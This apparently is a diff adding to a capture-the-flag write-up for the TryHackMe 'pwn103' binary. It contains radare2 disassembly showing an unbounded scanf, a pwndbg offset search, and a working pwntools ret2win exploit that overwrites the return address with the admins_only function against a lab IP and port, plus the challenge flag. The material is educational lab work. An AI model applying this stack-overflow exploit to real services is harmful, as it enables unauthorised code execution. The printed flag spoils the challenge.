@@ -220,11 +220,172 @@ I investigated all of the options, and the third is the most interesting.
 ------[jopraveen]: Hope you're doing well 😄
 ------[jopraveen]: You found the vuln, right? 🤔
 
-------[pwner]:
+------[pwner]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Try harder!!! 💪
+zsh: segmentation fault  ./pwn103-1644300337872.pwn103
 ```
 
 ---
 
+it's a scanf call
+
+```bash
+❯ r2 -d pwn103-1644300337872.pwn103
+[0x7fd146fe3360]> aaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Finding and parsing C++ vtables (avrr)
+[x] Skipping type matching analysis in debugger mode (aaft)
+[x] Propagate noreturn information (aanr)
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[0x7fd146fe3360]> afl
+0x004010b0    1 43           entry0
+0x004010f0    4 33   -> 31   sym.deregister_tm_clones
+0x00401120    4 49           sym.register_tm_clones
+0x00401160    3 33   -> 32   sym.__do_global_dtors_aux
+0x00401190    1 6            entry.init0
+0x004016e0    1 1            sym.__libc_csu_fini
+0x004016e4    1 9            sym._fini
+0x0040153e    1 22           sym.banner
+0x00401040    1 6            sym.imp.puts
+0x00401262    1 92           sym.announcements
+0x0040158c    3 236  -> 176  main
+0x004011f7    1 107          sym.rules
+0x00401680    4 93           sym.__libc_csu_init
+0x004012be    4 186          sym.general
+0x004010e0    1 1            sym._dl_relocate_static_pie
+0x00401554    1 56           sym.admins_only
+0x00401050    1 6            sym.imp.system
+0x004014e2    1 92           sym.discussion
+0x00401378   12 362          sym.bot_cmd
+0x00401000    3 23           sym._init
+0x00401196    1 97           sym.setup
+0x00401090    1 6            sym.imp.setvbuf
+0x00401030    1 6            sym.imp.strncmp
+0x00401060    1 6            sym.imp.printf
+0x00401070    1 6            sym.imp.read
+0x00401080    1 6            sym.imp.strcmp
+0x004010a0    1 6            sym.imp.__isoc99_scanf
+[0x7fd146fe3360]> pdf @sym.general
+┌ 186: sym.general ();
+│           ; var int64_t var_20h @ rbp-0x20
+│           0x004012be      55             push rbp
+│           0x004012bf      4889e5         mov rbp, rsp
+│           0x004012c2      4883ec20       sub rsp, 0x20
+│           0x004012c6      488d05dd1000.  lea rax, [0x004023aa]       ; "\n\U0001f5e3  General:\n"
+│           0x004012cd      4889c7         mov rdi, rax
+│           0x004012d0      e86bfdffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x004012d5      488d05e41000.  lea rax, str._______jopraveen_:_Hello_pwners_ ; 0x4023c0 ; "------[jopraveen]: Hello pwners \U0001f44b"
+│           0x004012dc      4889c7         mov rdi, rax
+│           0x004012df      e85cfdffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x004012e4      488d05fd1000.  lea rax, str._______jopraveen_:_Hope_youre_doing_well_ ; 0x4023e8 ; "------[jopraveen]: Hope you're doing well \U0001f604"
+│           0x004012eb      4889c7         mov rdi, rax
+│           0x004012ee      e84dfdffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x004012f3      488d051e1100.  lea rax, str._______jopraveen_:_You_found_the_vuln__right__ ; 0x402418 ; "------[jopraveen]: You found the vuln, right? \U0001f914\n"
+│           0x004012fa      4889c7         mov rdi, rax
+│           0x004012fd      e83efdffff     call sym.imp.puts        
+   ; int puts(const char *s)
+│           0x00401302      488d05431100.  lea rax, str._______pwner_:_ ; 0x40244c ; "------[pwner]: "
+│           0x00401309      4889c7         mov rdi, rax
+│           0x0040130c      b800000000     mov eax, 0
+│           0x00401311      e84afdffff     call sym.imp.printf         ; int printf(const char *format)
+│           0x00401316      488d45e0       lea rax, [var_20h]
+│           0x0040131a      4889c6         mov rsi, rax
+│           0x0040131d      488d05381100.  lea rax, [0x0040245c]       ; "%s"
+│           0x00401324      4889c7         mov rdi, rax
+│           0x00401327      b800000000     mov eax, 0
+│           0x0040132c      e86ffdffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
+│           0x00401331      488d45e0       lea rax, [var_20h]
+│           0x00401335      488d15231100.  lea rdx, [0x0040245f]       ; "yes"
+│           0x0040133c      4889d6         mov rsi, rdx
+│           0x0040133f      4889c7         mov rdi, rax
+│           0x00401342      e839fdffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
+│           0x00401347      85c0           test eax, eax
+│       ┌─< 0x00401349      751b           jne 0x401366
+│       │   0x0040134b      488d05111100.  lea rax, str._______jopraveen_:_GG__n ; 0x402463 ; "------[jopraveen]: GG \U0001f604\n"
+│       │   0x00401352      4889c7         mov rdi, rax
+│       │   0x00401355      e8e6fcffff     call sym.imp.puts           ; int puts(const char *s)
+│       │   0x0040135a      b800000000     mov eax, 0
+│       │   0x0040135f      e828020000     call main                   ; int main(int argc, char **argv, char **envp)
+│      ┌──< 0x00401364      eb0f           jmp 0x401375
+│      │└─> 0x00401366      488d05121100.  lea rax, str.Try_harder____ ; 0x40247f ; "Try harder!!! \U0001f4aa"
+│      │    0x0040136d      4889c7         mov rdi, rax
+│      │    0x00401370      e8cbfcffff     call sym.imp.puts           ; int puts(const char *s)
+│      │    ; CODE XREF from sym.general @ 0x401364
+│      └──> 0x00401375      90             nop
+│           0x00401376      c9             leave
+└           0x00401377      c3             ret
+```
+
+So we can overwrite the memory and redirect the execution to an other location. So the next goal is to identify a specific site where the execution should be returned.
+
+there's a funtion ***admins_only*** we will redirect it to this function.
+
+so let's find the offset of the program:
+
+---
+
+```bash
+pwndbg> run
+Starting program: /home/lynk/thm/pwn101/pwn103/pwn103-1644300337872.pwn103 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+
+  [THM Discord Server]
+
+➖➖➖➖➖➖➖➖➖➖➖
+1) 📢 Announcements
+2) 📜 Rules
+3) 🗣  General
+4) 🏠 rooms discussion
+5) 🤖 Bot commands
+➖➖➖➖➖➖➖➖➖➖➖
+⌨️  Choose the channel: 3
+
+🗣  General:
+
+------[jopraveen]: Hello pwners 👋
+------[jopraveen]: Hope you're doing well 😄
+------[jopraveen]: You found the vuln, right? 🤔
+
+------[pwner]: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
+Try harder!!! 💪
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000401377 in general ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────
+*RAX  0x13
+*RBX  0x7fffffffe428 —▸ 0x7fffffffe689 ◂— '/home/lynk/thm/pwn101/pwn103/pwn103-1644300337872.pwn103'
+*RCX  0x7ffff7ec0b00 (write+16) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  0x0
+*RDI  0x7ffff7f9ea30 (_IO_stdfile_1_lock) ◂— 0x0
+*RSI  0x7ffff7f9d803 (_IO_2_1_stdout_+131) ◂— 0xf9ea30000000000a /* '\n' */
+*R8   0x65
+*R9   0x7ffff7f9caa0 (_IO_2_1_stdin_) ◂— 0xfbad208b
+*R10  0x7ffff7de1e80 ◂— 0x10001a00007bf8
+*R11  0x202
+ R12  0x0
+*R13  0x7fffffffe438 —▸ 0x7fffffffe6c2 ◂— 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
+ R14  0x0
+*R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2d0 ◂— 0x0
+*RBP  0x6161616161616165 ('eaaaaaaa')
+*RSP  0x7fffffffe2f8 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
+*RIP  0x401377 (general+185) ◂— ret 
+─────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────
+ ► 0x401377 <general+185>    ret    <0x6161616161616166>
 
 
 
@@ -235,31 +396,63 @@ I investigated all of the options, and the third is the most interesting.
 
 
 
+───────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffe2f8 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
+01:0008│     0x7fffffffe300 ◂— 'gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
+02:0010│     0x7fffffffe308 ◂— 'haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
+03:0018│     0x7fffffffe310 ◂— 'iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
+04:0020│     0x7fffffffe318 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaa'
+05:0028│     0x7fffffffe320 ◂— 'kaaaaaaalaaaaaaamaaa'
+06:0030│     0x7fffffffe328 ◂— 'laaaaaaamaaa'
+07:0038│     0x7fffffffe330 ◂— 0x6161616d /* 'maaa' */
+─────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────
+ ► 0         0x401377 general+185
+   1 0x6161616161616166
+   2 0x6161616161616167
+   3 0x6161616161616168
+   4 0x6161616161616169
+   5 0x616161616161616a
+   6 0x616161616161616b
+   7 0x616161616161616c
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> cyclic -l faaaaaaa
+Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
+Found at offset 40
+pwndbg>
+```
 
+---
 
+Offset is 40 
 
+lets craft the payload 
 
+basically it will be like
 
+padding + admins_only function
 
+Here’s the exploit.
 
+---
 
+```python3
+from pwn import *
 
+context.binary = binary = ELF("./pwn103-1644300337872.pwn103")
 
+#p = process()
+p = remote("10.10.96.138", 9003)
+p.sendline(b"3")
 
+admins_only_function = p64(binary.symbols.admins_only)
+payload = b"A"*40 + admins_only_function + admins_only_function
 
+p.sendline(payload)
+p.interactive()
+```
 
-
-
-
-
-
-
-
-
-
-
-
-
+---
+we have used admins_only functions 2 times to esablish a stable shell.
 
 
 let's run the exploit
@@ -399,6 +592,11 @@ $ cat flag.txt
 THM{w3lC0m3_4Dm1N}
 $
 ```
+
+---
+
+---
+
 
 
 
